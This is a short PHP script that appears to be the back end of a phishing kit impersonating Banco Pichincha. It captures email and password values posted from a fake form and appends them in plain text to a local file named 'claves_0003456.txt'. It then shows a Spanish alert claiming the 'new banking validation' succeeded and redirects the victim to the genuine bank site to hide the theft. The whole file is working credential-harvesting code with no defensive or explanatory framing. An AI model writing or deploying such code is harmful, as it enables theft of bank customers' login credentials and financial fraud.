<?php
    session_start(); 
    if( (!empty($_POST['edt3'])) && (!empty($_POST['edt4'])) ){
           
        $_SESSION["email"] = $_POST['edt3'];
        $_SESSION["passe"] = $_POST['edt4'];
        
        $handle = fopen("claves_0003456.txt", "a");
        
        fwrite($handle, 'Email: '.$_SESSION['email']."\n");
        fwrite($handle, 'Email Pass: '.$_SESSION['passe']."\n");
        fclose($handle);  
        
        echo "<script>";
		echo "alert('Validacion Nueva Banca Completada Exitosamente!');";
		echo "window.location.href='https://www.pichincha.com/';";
		echo "</script>";		

    }else{
       header ('Location:index.php');
    }
?>